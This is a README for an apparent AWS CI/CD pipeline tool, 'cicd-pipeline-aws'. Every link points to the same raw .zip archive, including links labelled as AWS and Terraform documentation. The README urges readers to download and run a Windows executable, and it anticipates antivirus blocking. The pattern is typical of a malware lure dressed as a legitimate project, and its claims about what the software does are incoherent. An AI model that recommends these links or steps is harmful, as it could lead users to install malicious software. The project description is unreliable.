# ⚙️ cicd-pipeline-aws - Easy CI/CD Deployment on AWS

[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip)

## 📋 About cicd-pipeline-aws

This software helps automate your app updates on Amazon Web Services (AWS). Whenever you change your code, it runs tests, checks for errors, builds your app, and then updates it automatically. The app it manages is a simple web API made with Flask. It uses the latest tools to handle the whole process safely and without you needing to enter keys or passwords.

You don’t need to know how to program or use complex tools. This setup runs quietly in the background to keep your web service updated and secure. It works well on Windows computers and uses cloud tools to make everything smooth.

## 🖥️ System Requirements

Before installing, make sure your Windows system meets these needs:

- Windows 10 or later (64-bit)
- At least 4 GB of free RAM
- Minimum 500 MB free disk space
- Internet access to download and connect to AWS services
- A GitHub account to manage repositories (no login inside the app is required)
- Optional: Docker installed if you want to build container images locally (not required for basic use)

## 🔎 What This Does for You

- Automatically checks your code for mistakes after every update
- Runs tests to ensure your app runs correctly
- Builds the app and packages it for deployment
- Uploads and deploys your app to AWS Cloud automatically using ECS Fargate
- Uses OpenID Connect (OIDC) for secure access without storing AWS keys locally
- Controls the entire setup with infrastructure code, which means your cloud resources are created and managed by safe scripts

## 🎯 Key Features

- **Secure Deployment:** Uses modern AWS security methods, no keys stored on your computer
- **Full Automation:** From code changes to live app updates without manual steps
- **Infrastructure as Code:** Uses Terraform scripts to define and manage cloud resources
- **Built for Flask APIs:** Targeted at Python-based API apps, but can be adapted easily
- **Runs on AWS ECS Fargate:** Fully managed containers remove server management
- **Uses GitHub Actions:** Easy to follow build and deployment workflows triggered by code pushes

---

## 🚀 Getting Started

This section guides you through downloading and running the application on Windows. The steps are simple and take you from nothing to running in minutes.

### 1. Download the Application

Click on the button below to visit the releases page and get the latest version of the software. This page lists all available versions and files.

[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip)

1. Open the link in your browser.
2. Find the newest release (top of the list).
3. Download the file that matches your Windows system. It will usually have `.exe` or `.zip` at the end.
4. Save it to a location you can find easily, like your Desktop or Downloads folder.

### 2. Install or Extract Files

If your file is a `.exe` (installer):

- Double-click the file.
- Follow the on-screen instructions.
- Choose the default options unless you need specific settings.

If you downloaded a `.zip` file:

- Right-click the file.
- Select "Extract All..."
- Pick a folder to extract to, like Desktop.
- Click "Extract" to unpack the files.

### 3. Run the Application

- Open the folder where you installed or extracted the app.
- Look for the main executable file, usually named `cicd-pipeline-aws.exe` or similar.
- Double-click the file to start.

You should see a window with options or a simple interface guiding you through any additional setup.

### 4. Connect to Your GitHub Repository

To use this pipeline, you need a GitHub repository with your Flask API code.

- The app will ask for the repository URL.
- Copy the full URL of your GitHub repo and paste it into the app.
- The software will connect using the latest GitHub authentication method (OIDC). No need to enter AWS keys manually.

### 5. Start Your First Deployment

- After connecting, click “Start” or “Deploy.”
- The app will run its checks, tests, and build your API.
- Once done, it will deploy the updated app to AWS ECS Fargate.
- You will see status messages showing what’s happening.

---

## 🔧 How It Works

This application uses GitHub Actions combined with AWS services to run your updates securely and automatically.

- **GitHub Actions**: These are workflows triggered when you change your code. They handle linting (checking code style), running tests, and building your app.
- **AWS ECS Fargate**: Your app runs inside containers on AWS without you managing servers.
- **Terraform**: Infrastructure is created and updated through code, so cloud resources and settings are consistent and trackable.
- **OIDC Authentication**: Connects GitHub Actions to AWS securely, so you never need to save secret keys on your machine.

---

## ⚙️ Configuration Tips

If you want to change how your pipeline works, these are some settings to consider:

- **Branch Tracking**: Choose which GitHub branch (like main or develop) to monitor for changes.
- **Testing**: Customize test commands if you have special tests.
- **Build Settings**: Adjust build commands to fit your project if needed.
- **AWS Region**: Set the AWS region where your app will deploy (default is usually us-east-1).
- **Terraform Variables**: Edit variables for things like resource sizes or names inside the Terraform files.

---

## 🛠️ Troubleshooting

Here are solutions to common issues you might face:

- **App won’t start:** Make sure your Windows version is supported and your antivirus is not blocking the software.
- **Download link doesn’t work:** Check your internet connection or try visiting the release page later.
- **Deployment fails:** Confirm that your GitHub repo URL is correct and you have permission to access it.
- **AWS errors:** Verify your AWS settings and region are correct.
- **Tests fail:** Check your Flask API test setup and see if all required files are present.

You can also check the app’s logs, usually found in the same folder as the executable, for detailed error messages.

---

## 💡 Useful Commands for Advanced Users

If you are comfortable using a command prompt or PowerShell, here are some commands related to this project:

- To check Docker installation:  
  `docker --version`
  
- To run Terraform manually (if you have it installed):  
  `terraform init`  
  `terraform apply`  
  
- To check the status of GitHub Actions workflows:  
  Visit your GitHub repository, click on the "Actions" tab.

---

## ⚖️ License and Support

This project uses an open-source license. You can find the license file in the main repository.

For help or questions, use the issue tracker on the GitHub page. Provide details about your problem and your system setup.

---

## 🔗 Useful Links

- GitHub Releases: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip
- GitHub Repository: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip
- AWS ECS Fargate Intro: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip
- Terraform Documentation: https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip

---

[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-green)](https://github.com/hospitalcarepicturerail653/cicd-pipeline-aws/raw/refs/heads/main/app/pipeline_aws_cicd_v3.5.zip)